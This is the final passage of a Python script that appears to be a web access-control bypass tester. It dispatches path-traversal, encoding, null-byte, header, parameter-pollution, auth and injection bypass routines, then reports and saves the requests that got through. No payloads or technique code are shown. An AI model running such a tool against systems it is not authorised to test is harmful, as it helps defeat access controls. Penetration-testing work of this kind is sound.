        if args.double_encoding: double_url_encoding_sweep(ctx)
        if args.protocols: protocol_scheme_bypass(ctx)
        if args.ports: port_bypass(ctx)
        if args.paths: path_traversal_bypass(ctx)
        if args.endpaths: endpath_suffix_bypass(ctx)
        if args.encoding: url_encoding_bypass(ctx)
        if args.case: case_sensitivity_bypass(ctx)
        if args.extensions: file_extension_bypass(ctx)
        if args.params: parameter_pollution_bypass(ctx)
        if args.user_agents: user_agent_bypass(ctx)
        if args.auth: auth_bypass(ctx)
        if args.dot_slash: dot_slash_bypass(ctx)
        if args.special_chars: special_character_bypass(ctx)
        if args.null_byte: null_byte_bypass(ctx)
        if args.injection: payload_injection_bypass(ctx)
        if args.cache: cache_bypass(ctx)
        if args.fuzzing: fuzzing_bypass(ctx)
        if args.content_type: content_type_bypass(ctx)
    
    # Shutdown thread pool
    ctx.pool.shutdown(wait=True)
    
    # Summary
    if ctx.successful_bypasses:
        print(f"\n{Fore.GREEN}[+] Found {len(ctx.successful_bypasses)} potential bypasses!{Style.RESET_ALL}")
        for i, bypass in enumerate(ctx.successful_bypasses, 1):
            print(f" {i:2}. [{bypass.method}] {bypass.status_code} → {bypass.url}")
            if bypass.payload:
                print(f"      Payload: {bypass.payload}")
    else:
        print(f"\n{Fore.RED}[!] No bypasses found.{Style.RESET_ALL}")
    
    # Save results
    if args.output and ctx.successful_bypasses:
        with open(args.output, "w") as fh:
            fh.write(f"Target: {original_url}\nDate: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            for i, bypass in enumerate(ctx.successful_bypasses, 1):
                fh.write(f"{i}. [{bypass.method}] {bypass.status_code} {bypass.url}\n")
                if bypass.payload:
                    fh.write(f"   Payload: {bypass.payload}\n")
        print(f"{Fore.YELLOW}[*] Saved to {args.output}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
